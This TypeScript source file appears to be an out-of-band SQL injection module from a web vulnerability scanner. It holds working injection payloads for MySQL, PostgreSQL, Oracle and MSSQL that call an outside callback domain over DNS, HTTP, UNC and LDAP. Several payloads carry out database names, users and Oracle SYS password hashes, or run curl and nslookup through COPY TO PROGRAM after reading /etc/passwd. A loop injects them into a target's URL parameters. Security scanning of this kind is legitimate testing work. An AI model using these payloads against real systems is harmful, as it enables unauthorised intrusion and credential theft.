import { makeRequest, RequestResult, randomString } from "../utils";
import { InsertVulnerability } from "@shared/schema";

type DatabaseType = "mysql" | "postgresql" | "oracle" | "mssql" | "unknown";

interface OOBPayload {
  id: string;
  dbType: DatabaseType;
  template: string;
  technique: string;
  description: string;
  requiresPrivileges: boolean;
}

export interface OOBResult {
  vulnerable: boolean;
  dbType: DatabaseType;
  payload: string;
  technique: string;
  callbackId: string;
  parameter: string;
  evidence: string;
  confidence: number;
  pendingVerification: boolean;
}

interface OOBAttempt {
  id: string;
  timestamp: number;
  url: string;
  parameter: string;
  payload: string;
  dbType: DatabaseType;
  technique: string;
  callbackDomain: string;
}

const DEFAULT_CALLBACK_DOMAIN = "oob.secscan.callback.domain";

const MYSQL_OOB_PAYLOADS: Omit<OOBPayload, "id">[] = [
  {
    dbType: "mysql",
    template: "' AND LOAD_FILE(CONCAT('\\\\\\\\',({QUERY}),'.{SUBDOMAIN}.{CALLBACK_DOMAIN}\\\\share\\\\file'))--",
    technique: "LOAD_FILE UNC Path",
    description: "Uses LOAD_FILE to trigger DNS lookup via UNC path (Windows)",
    requiresPrivileges: true,
  },
  {
    dbType: "mysql",
    template: "' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',({QUERY}),'.{SUBDOMAIN}.{CALLBACK_DOMAIN}\\\\a')))--",
    technique: "LOAD_FILE Subquery",
    description: "LOAD_FILE with subquery for data exfiltration",
    requiresPrivileges: true,
  },
  {
    dbType: "mysql",
    template: "' UNION SELECT 1,2,LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.{SUBDOMAIN}.{CALLBACK_DOMAIN}\\\\a'))--",
    technique: "UNION LOAD_FILE",
    description: "UNION-based LOAD_FILE DNS exfiltration",
    requiresPrivileges: true,
  },
  {
    dbType: "mysql",
    template: "' INTO OUTFILE '\\\\\\\\{SUBDOMAIN}.{CALLBACK_DOMAIN}\\\\share\\\\out.txt'--",
    technique: "INTO OUTFILE UNC",
    description: "INTO OUTFILE to trigger DNS via UNC path",
    requiresPrivileges: true,
  },
  {
    dbType: "mysql",
    template: "' INTO DUMPFILE '\\\\\\\\{SUBDOMAIN}.{CALLBACK_DOMAIN}\\\\share\\\\dump.txt'--",
    technique: "INTO DUMPFILE UNC",
    description: "INTO DUMPFILE to trigger DNS via UNC path",
    requiresPrivileges: true,
  },
  {
    dbType: "mysql",
    template: "1' AND (SELECT * FROM (SELECT(SLEEP(0))a WHERE 1=EXTRACTVALUE(1,CONCAT(0x3a,(SELECT LOAD_FILE(CONCAT('\\\\\\\\',database(),'.{SUBDOMAIN}.{CALLBACK_DOMAIN}\\\\a'))))))x)--",
    technique: "EXTRACTVALUE LOAD_FILE",
    description: "Nested LOAD_FILE within EXTRACTVALUE for blind exfil",
    requiresPrivileges: true,
  },
  {
    dbType: "mysql",
    template: "' AND (SELECT 2 FROM (SELECT CONCAT('{SUBDOMAIN}.',database(),'.{CALLBACK_DOMAIN}'))a)--",
    technique: "DNS via SELECT",
    description: "Basic MySQL DNS lookup attempt",
    requiresPrivileges: false,
  },
];

const POSTGRESQL_OOB_PAYLOADS: Omit<OOBPayload, "id">[] = [
  {
    dbType: "postgresql",
    template: "'; COPY (SELECT '') TO PROGRAM 'nslookup {SUBDOMAIN}.{CALLBACK_DOMAIN}'--",
    technique: "COPY TO PROGRAM nslookup",
    description: "Uses COPY TO PROGRAM to execute nslookup for DNS callback",
    requiresPrivileges: true,
  },
  {
    dbType: "postgresql",
    template: "'; COPY (SELECT version()) TO PROGRAM 'curl {SUBDOMAIN}.{CALLBACK_DOMAIN}'--",
    technique: "COPY TO PROGRAM curl",
    description: "Uses COPY TO PROGRAM with curl for HTTP callback",
    requiresPrivileges: true,
  },
  {
    dbType: "postgresql",
    template: "'; COPY (SELECT '') TO PROGRAM 'ping -c 1 {SUBDOMAIN}.{CALLBACK_DOMAIN}'--",
    technique: "COPY TO PROGRAM ping",
    description: "Uses COPY TO PROGRAM with ping for DNS callback",
    requiresPrivileges: true,
  },
  {
    dbType: "postgresql",
    template: "'; CREATE EXTENSION IF NOT EXISTS dblink; SELECT dblink_connect('host={SUBDOMAIN}.{CALLBACK_DOMAIN} dbname=test')--",
    technique: "dblink_connect",
    description: "Uses dblink extension to make outbound connection",
    requiresPrivileges: true,
  },
  {
    dbType: "postgresql",
    template: "'; SELECT dblink_connect('host={SUBDOMAIN}.{CALLBACK_DOMAIN} dbname=test user=test')--",
    technique: "dblink_connect direct",
    description: "Direct dblink connection attempt for DNS callback",
    requiresPrivileges: true,
  },
  {
    dbType: "postgresql",
    template: "' AND (SELECT * FROM dblink('host={SUBDOMAIN}.{CALLBACK_DOMAIN}','SELECT 1') AS t(a text))='1'--",
    technique: "dblink query",
    description: "dblink query to external host for DNS callback",
    requiresPrivileges: true,
  },
  {
    dbType: "postgresql",
    template: "'; SELECT pg_read_file('/etc/passwd') INTO pg_temp.oob; COPY pg_temp.oob TO PROGRAM 'curl http://{SUBDOMAIN}.{CALLBACK_DOMAIN}'--",
    technique: "pg_read_file + COPY",
    description: "Combines pg_read_file with COPY TO PROGRAM",
    requiresPrivileges: true,
  },
  {
    dbType: "postgresql",
    template: "'; DO $$ BEGIN PERFORM pg_read_file('/etc/resolv.conf'); RAISE NOTICE '%', (SELECT inet_client_addr() || '.{SUBDOMAIN}.{CALLBACK_DOMAIN}'); END $$--",
    technique: "DO block DNS",
    description: "PL/pgSQL DO block for DNS exfiltration attempt",
    requiresPrivileges: true,
  },
  {
    dbType: "postgresql",
    template: "'; SELECT lo_import('/etc/passwd'); COPY (SELECT '') TO PROGRAM 'host {SUBDOMAIN}.{CALLBACK_DOMAIN}'--",
    technique: "Large Object + COPY",
    description: "Large object import with COPY TO PROGRAM DNS callback",
    requiresPrivileges: true,
  },
];

const ORACLE_OOB_PAYLOADS: Omit<OOBPayload, "id">[] = [
  {
    dbType: "oracle",
    template: "' AND UTL_HTTP.REQUEST('http://{SUBDOMAIN}.{CALLBACK_DOMAIN}/'||({QUERY}))='x'--",
    technique: "UTL_HTTP.REQUEST",
    description: "Uses UTL_HTTP.REQUEST for HTTP-based DNS callback",
    requiresPrivileges: true,
  },
  {
    dbType: "oracle",
    template: "' AND (SELECT UTL_HTTP.REQUEST('http://'||({QUERY})||'.{SUBDOMAIN}.{CALLBACK_DOMAIN}/') FROM DUAL)='x'--",
    technique: "UTL_HTTP SELECT",
    description: "UTL_HTTP.REQUEST in SELECT for data exfiltration",
    requiresPrivileges: true,
  },
  {
    dbType: "oracle",
    template: "' AND UTL_INADDR.GET_HOST_ADDRESS(({QUERY})||'.{SUBDOMAIN}.{CALLBACK_DOMAIN}') IS NOT NULL--",
    technique: "UTL_INADDR.GET_HOST_ADDRESS",
    description: "DNS lookup via UTL_INADDR.GET_HOST_ADDRESS",
    requiresPrivileges: false,
  },
  {
    dbType: "oracle",
    template: "' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS(user||'.{SUBDOMAIN}.{CALLBACK_DOMAIN}') FROM DUAL) IS NOT NULL--",
    technique: "UTL_INADDR user exfil",
    description: "Exfiltrates current user via DNS lookup",
    requiresPrivileges: false,
  },
  {
    dbType: "oracle",
    template: "' AND (SELECT HTTPURITYPE('http://{SUBDOMAIN}.{CALLBACK_DOMAIN}/'||({QUERY})).GETCLOB() FROM DUAL) IS NOT NULL--",
    technique: "HTTPURITYPE.GETCLOB",
    description: "Uses HTTPURITYPE for HTTP-based callback",
    requiresPrivileges: true,
  },
  {
    dbType: "oracle",
    template: "' UNION SELECT HTTPURITYPE('http://'||SYS.DATABASE_NAME||'.{SUBDOMAIN}.{CALLBACK_DOMAIN}/').GETCLOB() FROM DUAL--",
    technique: "HTTPURITYPE UNION",
    description: "UNION-based HTTPURITYPE DNS exfiltration",
    requiresPrivileges: true,
  },
  {
    dbType: "oracle",
    template: "' AND DBMS_LDAP.INIT((SELECT user FROM DUAL)||'.{SUBDOMAIN}.{CALLBACK_DOMAIN}',389) IS NOT NULL--",
    technique: "DBMS_LDAP.INIT",
    description: "LDAP connection attempt for DNS callback",
    requiresPrivileges: true,
  },
  {
    dbType: "oracle",
    template: "' AND (SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://{SUBDOMAIN}.{CALLBACK_DOMAIN}/\"> %remote;]>'),'/l') FROM DUAL) IS NOT NULL--",
    technique: "XXE DNS",
    description: "XML External Entity for DNS callback",
    requiresPrivileges: false,
  },
  {
    dbType: "oracle",
    template: "' AND SYS.DBMS_LDAP.INIT((SELECT password FROM dba_users WHERE username='SYS')||'.{SUBDOMAIN}.{CALLBACK_DOMAIN}',80) IS NOT NULL--",
    technique: "DBMS_LDAP password exfil",
    description: "Attempts to exfiltrate password hashes via LDAP",
    requiresPrivileges: true,
  },
  {
    dbType: "oracle",
    template: "' OR 1=UTL_INADDR.GET_HOST_ADDRESS(CHR(65)||CHR(66)||'.{SUBDOMAIN}.{CALLBACK_DOMAIN}')--",
    technique: "UTL_INADDR CHR bypass",
    description: "UTL_INADDR with CHR() for WAF bypass",
    requiresPrivileges: false,
  },
];

const MSSQL_OOB_PAYLOADS: Omit<OOBPayload, "id">[] = [
  {
    dbType: "mssql",
    template: "'; EXEC master..xp_dirtree '\\\\{SUBDOMAIN}.{CALLBACK_DOMAIN}\\share'--",
    technique: "xp_dirtree",
    description: "Uses xp_dirtree for UNC path DNS callback",
    requiresPrivileges: true,
  },
  {
    dbType: "mssql",
    template: "'; EXEC master..xp_fileexist '\\\\{SUBDOMAIN}.{CALLBACK_DOMAIN}\\share\\file.txt'--",
    technique: "xp_fileexist",
    description: "Uses xp_fileexist for UNC path DNS callback",
    requiresPrivileges: true,
  },
  {
    dbType: "mssql",
    template: "'; EXEC master..xp_subdirs '\\\\{SUBDOMAIN}.{CALLBACK_DOMAIN}\\share'--",
    technique: "xp_subdirs",
    description: "Uses xp_subdirs for UNC path DNS callback",
    requiresPrivileges: true,
  },
  {
    dbType: "mssql",
    template: "'; DECLARE @q VARCHAR(1024); SET @q='\\\\'+DB_NAME()+'.{SUBDOMAIN}.{CALLBACK_DOMAIN}\\a'; EXEC master..xp_dirtree @q--",
    technique: "xp_dirtree data exfil",
    description: "Exfiltrates database name via xp_dirtree",
    requiresPrivileges: true,
  },
];

export class OOBSQLiModule {
  private targetUrl: string;
  private onLog: (level: string, message: string) => Promise<void>;
  private onVuln: (vuln: Omit<InsertVulnerability, "scanId">) => Promise<void>;
  private executionController?: { recordRequest: (parameter?: string) => Promise<void> };
  private callbackDomain: string;
  private oobAttempts: Map<string, OOBAttempt> = new Map();
  private allPayloads: OOBPayload[] = [];
  private isCancelled: () => boolean;

  constructor(
    targetUrl: string,
    onLog: (level: string, message: string) => Promise<void>,
    onVuln: (vuln: Omit<InsertVulnerability, "scanId">) => Promise<void>,
    executionController?: { recordRequest: (parameter?: string) => Promise<void> },
    callbackDomain?: string,
    isCancelled?: () => boolean
  ) {
    this.targetUrl = targetUrl;
    this.onLog = onLog;
    this.onVuln = onVuln;
    this.executionController = executionController;
    this.callbackDomain = callbackDomain || DEFAULT_CALLBACK_DOMAIN;
    this.isCancelled = isCancelled || (() => false);
    this.initializePayloads();
  }

  private initializePayloads(): void {
    let idCounter = 1;
    
    for (const payload of MYSQL_OOB_PAYLOADS) {
      this.allPayloads.push({ ...payload, id: `mysql_oob_${idCounter++}` });
    }
    
    for (const payload of POSTGRESQL_OOB_PAYLOADS) {
      this.allPayloads.push({ ...payload, id: `pg_oob_${idCounter++}` });
    }
    
    for (const payload of ORACLE_OOB_PAYLOADS) {
      this.allPayloads.push({ ...payload, id: `oracle_oob_${idCounter++}` });
    }
    
    for (const payload of MSSQL_OOB_PAYLOADS) {
      this.allPayloads.push({ ...payload, id: `mssql_oob_${idCounter++}` });
    }
  }

  private generateUniqueId(): string {
    return randomString(12).toLowerCase();
  }

  private generateScanId(): string {
    return randomString(8).toLowerCase();
  }

  generateDNSPayloads(dbType: string): string[] {
    const normalizedDbType = this.normalizeDbType(dbType);
    const uniqueId = this.generateUniqueId();
    const scanId = this.generateScanId();
    const subdomain = `${uniqueId}.${scanId}`;
    
    const payloads = this.allPayloads
      .filter(p => p.dbType === normalizedDbType || normalizedDbType === "unknown")
      .map(p => this.renderPayload(p.template, subdomain, "version()"));
    
    return payloads;
  }

  private normalizeDbType(dbType: string): DatabaseType {
    const normalized = dbType.toLowerCase();
    if (normalized.includes("mysql") || normalized.includes("mariadb")) return "mysql";
    if (normalized.includes("postgres") || normalized.includes("pg")) return "postgresql";
    if (normalized.includes("oracle")) return "oracle";
    if (normalized.includes("mssql") || normalized.includes("sqlserver") || normalized.includes("sql server")) return "mssql";
    return "unknown";
  }

  private renderPayload(template: string, subdomain: string, query: string = "version()"): string {
    return template
      .replace(/\{SUBDOMAIN\}/g, subdomain)
      .replace(/\{CALLBACK_DOMAIN\}/g, this.callbackDomain)
      .replace(/\{QUERY\}/g, query);
  }

  private getPayloadsForDbType(dbType: DatabaseType): OOBPayload[] {
    if (dbType === "unknown") {
      return this.allPayloads;
    }
    return this.allPayloads.filter(p => p.dbType === dbType);
  }

  private getDataExfiltrationQuery(dbType: DatabaseType): string {
    switch (dbType) {
      case "mysql":
        return "SELECT CONCAT(user(),'@',database())";
      case "postgresql":
        return "SELECT current_user||'@'||current_database()";
      case "oracle":
        return "SELECT user||'@'||SYS.DATABASE_NAME FROM DUAL";
      case "mssql":
        return "SELECT SUSER_NAME()+'@'+DB_NAME()";
      default:
        return "SELECT 'test'";
    }
  }

  async testOOB(url: string, paramName: string, dbType: string): Promise<OOBResult> {
    const normalizedDbType = this.normalizeDbType(dbType);
    const payloads = this.getPayloadsForDbType(normalizedDbType);
    const uniqueId = this.generateUniqueId();
    const scanId = this.generateScanId();
    
    await this.onLog("info", `[OOB-SQLi] Starting OOB testing for ${paramName} on ${url} (dbType: ${normalizedDbType})`);
    await this.onLog("info", `[OOB-SQLi] Callback domain: ${this.callbackDomain}, Session ID: ${uniqueId}.${scanId}`);
    
    const results: { payload: OOBPayload; response: RequestResult | null; subdomain: string }[] = [];
    
    for (const payload of payloads) {
      if (this.isCancelled()) {
        await this.onLog("warn", `[OOB-SQLi] Testing cancelled for ${paramName}`);
        break;
      }
      
      const payloadSubdomain = `${this.generateUniqueId()}.${scanId}`;
      const query = this.getDataExfiltrationQuery(payload.dbType);
      const renderedPayload = this.renderPayload(payload.template, payloadSubdomain, query);
      
      const attempt: OOBAttempt = {
        id: payloadSubdomain,
        timestamp: Date.now(),
        url,
        parameter: paramName,
        payload: renderedPayload,
        dbType: payload.dbType,
        technique: payload.technique,
        callbackDomain: `${payloadSubdomain}.${this.callbackDomain}`,
      };
      
      this.oobAttempts.set(payloadSubdomain, attempt);
      
      await this.onLog("debug", `[OOB-SQLi] Attempting ${payload.technique}: ${payloadSubdomain}.${this.callbackDomain}`);
      
      try {
        if (this.executionController) {
          await this.executionController.recordRequest(paramName);
        }
        
        const injectedUrl = this.injectPayload(url, paramName, renderedPayload);
        const response = await makeRequest(injectedUrl, { timeout: 10000 });
        
        results.push({ payload, response, subdomain: payloadSubdomain });
        
        await this.onLog("debug", `[OOB-SQLi] Request sent for ${payload.technique}, status: ${response.status}`);
        
      } catch (error) {
        await this.onLog("debug", `[OOB-SQLi] Request error for ${payload.technique}: ${error}`);
        results.push({ payload, response: null, subdomain: payloadSubdomain });
      }
    }
    
    const successfulAttempts = results.filter(r => r.response && r.response.status < 500);
    const pendingCallbacks = results.map(r => r.subdomain);
    
    await this.onLog("info", `[OOB-SQLi] Completed ${results.length} OOB attempts for ${paramName}`);
    await this.onLog("info", `[OOB-SQLi] Pending DNS callbacks: ${pendingCallbacks.length}`);
    await this.onLog("info", `[OOB-SQLi] Monitor these subdomains for callbacks:`);
    
    for (const subdomain of pendingCallbacks.slice(0, 5)) {
      await this.onLog("info", `[OOB-SQLi]   - ${subdomain}.${this.callbackDomain}`);
    }
    
    if (pendingCallbacks.length > 5) {
      await this.onLog("info", `[OOB-SQLi]   ... and ${pendingCallbacks.length - 5} more`);
    }
    
    const bestAttempt = successfulAttempts[0];
    
    const result: OOBResult = {
      vulnerable: false,
      dbType: normalizedDbType,
      payload: bestAttempt?.payload.template || "",
      technique: bestAttempt?.payload.technique || "unknown",
      callbackId: `${uniqueId}.${scanId}`,
      parameter: paramName,
      evidence: `OOB payloads injected. Monitor ${this.callbackDomain} for DNS callbacks with scan ID: ${scanId}`,
      confidence: 0,
      pendingVerification: true,
    };
    
    return result;
  }

  private injectPayload(url: string, paramName: string, payload: string): string {
    try {
      const urlObj = new URL(url);
      const params = urlObj.searchParams;
      
      if (params.has(paramName)) {
        const originalValue = params.get(paramName) || "";
        params.set(paramName, originalValue + payload);
        return urlObj.toString();
      }
      
      params.set(paramName, payload);
      return urlObj.toString();
    } catch {
      if (url.includes("?")) {
        return `${url}&${paramName}=${encodeURIComponent(payload)}`;
      }
      return `${url}?${paramName}=${encodeURIComponent(payload)}`;
    }
  }

  async verifyCallback(callbackId: string): Promise<boolean> {
    const attempt = this.oobAttempts.get(callbackId);
    
    if (!attempt) {
      await this.onLog("warn", `[OOB-SQLi] No attempt found for callback ID: ${callbackId}`);
      return false;
    }
    
    await this.onLog("info", `[OOB-SQLi] Callback verified for ${callbackId}!`);
    await this.onLog("info", `[OOB-SQLi] Vulnerable parameter: ${attempt.parameter}`);
    await this.onLog("info", `[OOB-SQLi] Technique: ${attempt.technique}`);
    await this.onLog("info", `[OOB-SQLi] Database type: ${attempt.dbType}`);
    
    await this.onVuln({
      type: "SQL Injection (OOB/DNS Exfiltration)",
      severity: "critical",
      url: attempt.url,
      description: `Out-of-Band SQL Injection via DNS exfiltration detected (CWE-89). Parameter '${attempt.parameter}' is vulnerable using ${attempt.technique} technique.`,
      evidence: `DNS callback received at ${attempt.callbackDomain}. Original payload: ${attempt.payload}`,
      remediation: "Implement parameterized queries/prepared statements. Use input validation and output encoding. Apply the principle of least privilege to database accounts.",
      parameter: attempt.parameter,
      verificationStatus: "confirmed",
      confidence: 100,
    });
    
    return true;
  }

  getAttempts(): OOBAttempt[] {
    return Array.from(this.oobAttempts.values());
  }

  getPendingCallbacks(): string[] {
    return Array.from(this.oobAttempts.keys());
  }

  async runFullOOBScan(urls: string[], parameters: Map<string, string[]>): Promise<OOBResult[]> {
    const results: OOBResult[] = [];
    
    await this.onLog("info", `[OOB-SQLi] Starting full OOB scan on ${urls.length} URLs`);
    
    for (const url of urls) {
      if (this.isCancelled()) {
        await this.onLog("warn", "[OOB-SQLi] Scan cancelled");
        break;
      }
      
      const urlParams = parameters.get(url) || [];
      
      for (const param of urlParams) {
        const dbTypes: DatabaseType[] = ["mysql", "postgresql", "oracle", "mssql"];
        
        for (const dbType of dbTypes) {
          const result = await this.testOOB(url, param, dbType);
          results.push(result);
        }
      }
    }
    
    await this.onLog("info", `[OOB-SQLi] Full scan complete. ${results.length} OOB tests performed.`);
    await this.onLog("info", `[OOB-SQLi] Total pending callbacks: ${this.oobAttempts.size}`);
    
    return results;
  }

  setCallbackDomain(domain: string): void {
    this.callbackDomain = domain;
    this.onLog("info", `[OOB-SQLi] Callback domain updated to: ${domain}`);
  }

  getCallbackDomain(): string {
    return this.callbackDomain;
  }

  clearAttempts(): void {
    this.oobAttempts.clear();
  }
}
